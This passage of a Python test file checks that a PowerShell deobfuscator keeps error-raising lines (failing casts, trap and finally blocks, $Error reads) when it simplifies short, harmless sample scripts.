    def test_a_store_a_failing_cast_overwrites_under_a_resuming_trap_is_kept(self):
        self.assertIn('$x = 1', self._deobfuscate("trap { continue }; $x = 1; $x = [int]'a'; throw 'y'; Write-Host $x"))


class TestPs1AFailingLineInAFinallyAJumpPassesThroughIsKept(TestPs1):

    def test_a_failing_line_in_a_finally_a_return_passes_through_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { try { return } finally { $null = [int]'a' } } catch { }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_a_continue_passes_through_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "foreach ($i in 1, 2) { try { try { continue } finally { $null = [int]'a' } } catch { }; "
            "Write-Host \"m$i\" }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_an_exit_passes_through_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "try { try { if ($Host) { exit } } finally { $null = [int]'a' } } catch { }; Write-Host 'after'"))

    def test_a_failing_line_in_a_finally_a_return_from_a_function_passes_through_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { try { try { return 'r' } finally { $null = [int]'a' } } catch { }; 'tail' }; "
            "Write-Host (f)"))


class TestPs1ACatchBodyThatRunsAnotherBodyStaysWhereItIs(TestPs1):

    def test_a_catch_body_that_calls_a_function_is_not_lifted(self):
        self.assertIn('catch', self._deobfuscate(
            "function g { $null = [int]'a'; Write-Host 'in' }; try { throw 'x' } catch { g }; Write-Host 'after'"))

    def test_a_catch_body_that_runs_a_script_block_is_not_lifted(self):
        self.assertIn('catch', self._deobfuscate(
            "try { throw 'x' } catch { & { $null = [int]'a'; Write-Host 'in' } }; Write-Host 'after'"))

    def test_a_catch_body_that_hands_a_block_to_a_command_is_not_lifted(self):
        self.assertIn('catch', self._deobfuscate(
            "try { throw 'x' } catch { 1 | ForEach-Object { $null = [int]'a'; Write-Host 'in' } }; Write-Host 'after'"))


class TestPs1AFailingLineInATrapBodyACallFiresIsKept(TestPs1):

    def test_a_failing_line_in_a_trap_body_a_function_fires_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { $null = [int]'b' }; trap { Write-Host 'T'; $null = [int]'a'; continue }; f; Write-Host 'after'"))

    def test_a_failing_line_in_a_trap_body_a_script_block_fires_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "trap { Write-Host 'T'; $null = [int]'a'; continue }; & { $null = [int]'b' }; Write-Host 'after'"))


class TestPs1AFailingLineInATrapBodyAnythingMayFireIsKept(TestPs1):

    def test_a_failing_line_in_a_trap_body_an_unknown_command_fires_is_kept(self):
        deobfuscated = self._deobfuscate(
            "$s = $env:COMPUTERNAME; try { trap { $null = [int]$s; continue }; Invoke-Nonexistent; "
            "Write-Host 'rest' } catch { Write-Host 'caught' }"
        )
        self.assertIn('[int]$s', deobfuscated)

    def test_a_failing_line_in_a_trap_body_a_cast_in_an_if_test_fires_is_kept(self):
        deobfuscated = self._deobfuscate(
            "$s = $env:COMPUTERNAME; $t = $env:USERNAME; try { trap { $null = [int]$s; continue }; "
            "if ([int]$t) { Write-Host 'x' }; Write-Host 'rest' } catch { Write-Host 'caught' }"
        )
        self.assertIn('[int]$s', deobfuscated)


class TestPs1AnAdvancedFunctionToldToStopRunsUnderStop(TestPs1):

    @backlog
    def test_a_failing_line_in_an_advanced_function_told_to_stop_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { [CmdletBinding()] param() $null = [int]'a'; Write-Host 'in-f' }; f -ErrorAction Stop; "
            "Write-Host 'end'"))

    @backlog
    def test_a_bare_failing_line_in_an_advanced_function_told_to_stop_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { [CmdletBinding()] param() [int]'a'; Write-Host 'in-f' }; f -ErrorAction Stop; "
            "Write-Host 'end'"))


class TestPs1AnErrorNoticedOutsideTheBodyThatRaisesItKeepsTheRaise(TestPs1):

    @backlog
    def test_a_bare_raise_whose_error_the_call_redirects_to_a_file_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { [int]'a'; Write-Host 'in' }\nf 2> err.txt\nWrite-Host 'after'"))

    @backlog
    def test_a_discarded_raise_whose_error_the_call_redirects_to_a_file_is_kept(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { $Null = [int]'a'; Write-Host 'in' }\nf 2> err.txt\nWrite-Host 'after'"))

    @backlog
    def test_a_bare_raise_in_a_called_body_is_kept_where_the_error_record_is_read_after_the_call(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { [int]'a'; Write-Host 'x' }\nf\nWrite-Host $Error.Count"))

    @backlog
    def test_a_discarded_raise_in_a_called_body_is_kept_where_the_error_record_is_read_after_the_call(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "function f { $Null = [int]'a'; Write-Host 'x' }\nf\nWrite-Host $Error.Count"))


class TestPs1EverySpellingOfAReadOfTheErrorRecordKeepsTheRaise(TestPs1):

    @backlog
    def test_a_read_through_the_session_api_keeps_the_raise(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "[int]'a'\nWrite-Host $ExecutionContext.SessionState.PSVariable.GetValue('Error').Count"))

    @backlog
    def test_a_read_through_the_variable_drive_keeps_the_raise(self):
        self.assertIn("[int]'a'", self._deobfuscate(
            "[int]'a'\nWrite-Host (Get-Content variable:Error).Count"))


class TestPs1AnUnreadablePayloadMayEndTheScriptAtAnyRaiseBelowIt(TestPs1):

    @backlog
    def test_a_bare_division_by_zero_below_an_unreadable_payload_is_kept(self):
        self.assertIn('1 / 0', self._deobfuscate(
            "Invoke-Expression $p\n1/0\nWrite-Host 'after'"))

    @backlog
    def test_a_discarded_division_by_zero_below_an_unreadable_payload_is_kept(self):
        self.assertIn('1 / 0', self._deobfuscate(
            "Invoke-Expression $p\n$Null = 1/0\nWrite-Host 'after'"))


class TestPs1RemovingATrapReadsWhereItsErrorsLand(TestPs1):

    @backlog
    def test_a_trap_whose_resumption_ends_a_loop_is_kept(self):
        self.assertIn('trap', self._deobfuscate(
            "$s = 'a'; trap { continue }; while ($Host) { $null = [int]$s }; Write-Host 'after'"))

    def test_a_trap_that_takes_an_error_replacing_a_return_is_kept(self):
        self.assertIn('trap', self._deobfuscate(
            "trap { continue }; try { if ($Host) { return } } finally { $null = [int]'a' }; Write-Host 'after'"))
